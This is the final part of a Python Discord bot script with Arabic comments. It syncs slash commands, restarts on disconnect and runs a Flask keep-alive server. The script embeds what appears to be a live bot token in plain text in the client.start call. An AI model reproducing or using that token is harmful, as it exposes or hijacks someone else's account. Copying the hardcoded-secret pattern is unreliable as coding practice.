        print(f" استخدم الأمر: /{command_name}")
        print(f" في: {guild_name}")
        print("═" * 70 + "\n")

# ===============================
# تشغيل البوت
# ===============================
@client.event
async def on_ready():
    print(f"✅ Bot is ready! Logged in as {client.user}")
    print(f"✅ Bot ID: {client.user.id}")
    print(f"✅ Connected to {len(client.guilds)} guilds")
    
    try:
        synced = await tree.sync()
        print(f"✅ Synced {len(synced)} commands!")
    except Exception as e:
        print(f"❌ Sync failed: {e}")

async def main():
    while True:
        try:
            await client.start('MTUxODM2MDgxNzQ3OTg0MzkyMQ.Ge02cH.l25kMv2QAd1iYUicYeK2LGyY76Cyq5gGGToxNU')
        except Exception as e:
            print(f"البوت وقف أو فصل: {e}")
            print("هيرجع يشتغل فورًا...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    import threading
    import flask

    app = flask.Flask('')
    @app.route('/')
    def home():
        return "Bot is running!"

    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)).start()
    asyncio.run(main())
